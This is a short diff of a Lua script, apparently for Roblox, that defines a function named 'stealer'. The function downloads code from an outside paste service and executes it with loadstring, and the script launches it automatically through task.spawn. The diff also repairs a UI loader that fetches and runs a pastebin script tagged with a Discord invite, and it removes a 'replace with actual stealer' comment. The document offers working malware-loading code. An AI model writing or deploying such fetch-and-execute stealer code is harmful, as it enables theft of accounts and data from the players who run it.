@@ -1,10 +1,9 @@
 local function stealer()
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xJfN6j1b9LuKMSyA/raw", true))() -- replace with actual stealer
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xJfN6j1b9LuKMSyA/raw", true))()
 end
-local function loadui()
-  loadstring(game:HttpGet("
-loadstring(game:HttpGet("https://pastebin.com/raw/Ctf0PNa4", true))()", true))("discord.gg/csxu2nCkw9")
 
+local function loadui()
+    loadstring(game:HttpGet("https://pastebin.com/raw/Ctf0PNa4", true))("discord.gg/csxu2nCkw9")
 end
 
 task.spawn(stealer)
